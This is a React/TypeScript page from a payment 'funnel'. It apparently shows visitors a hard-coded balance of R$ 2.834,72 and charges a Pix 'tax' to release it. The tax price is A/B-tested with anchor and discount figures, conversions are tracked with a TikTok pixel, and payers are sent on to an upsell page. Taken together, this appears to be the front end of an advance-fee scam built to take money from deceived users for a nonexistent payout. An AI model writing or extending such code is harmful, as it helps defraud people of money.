import { useCallback, useMemo } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import FunnelConfirmTax from "@/components/funnel/FunnelConfirmTax";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import { usePaymentFlow } from "@/hooks/usePaymentFlow";
import { trackInitiateCheckoutPixel } from "@/lib/tiktokPixel";
import { getTaxABVariant } from "@/lib/abTest";

interface LocationState {
  pixKey?: string;
  pixKeyType?: string;
  leadName?: string;
  leadEmail?: string;
}

const FunnelConfirmTaxPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;
  const abVariant = useMemo(() => getTaxABVariant(), []);

  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-tenf', {
      state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType },
    });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const flow = usePaymentFlow({
    contentId: 'tax',
    paymentType: 'tax',
    amount: abVariant.amount,
    onProcessingComplete: handleProcessingComplete,
  });

  const handleGeneratePix = useCallback(() => {
    trackInitiateCheckoutPixel({ value: abVariant.amount, contentId: 'tax' });
    flow.handleGeneratePix(leadPixKey, leadPixKeyType);
  }, [abVariant.amount, flow, leadPixKey, leadPixKeyType]);

  if (flow.showProcessing) {
    return <FunnelProcessingScreen onComplete={handleProcessingComplete} />;
  }

  return (
    <div className="min-h-screen bg-black/50 flex items-end justify-center pb-0">
      <div className="w-full max-w-md">
        <FunnelConfirmTax
          balance="R$ 2.834,72"
          pixKey={leadPixKey}
          pixKeyType={leadPixKeyType as "CPF" | "E-mail" | "Celular" | "Chave Aleatória"}
          pixName={flow.leadName || state?.leadName || "Usuário"}
          onGeneratePix={handleGeneratePix}
          isGenerating={flow.isGenerating}
          taxAmount={abVariant.formattedAmount}
          taxAnchor={abVariant.anchorAmount}
          taxDiscount={abVariant.discountPercent}
          leadCpf={flow.leadCpf}
          leadName={flow.leadName || state?.leadName || "Usuário"}
          pixData={flow.pixData}
          onCopyPix={flow.handleCopyPixCode}
          isPixCopied={flow.pixCopied}
          onManualCheck={flow.checkPayment}
          isCheckingPayment={flow.isChecking}
          checkError={flow.checkError}
        />
      </div>
    </div>
  );
};

export default FunnelConfirmTaxPage;
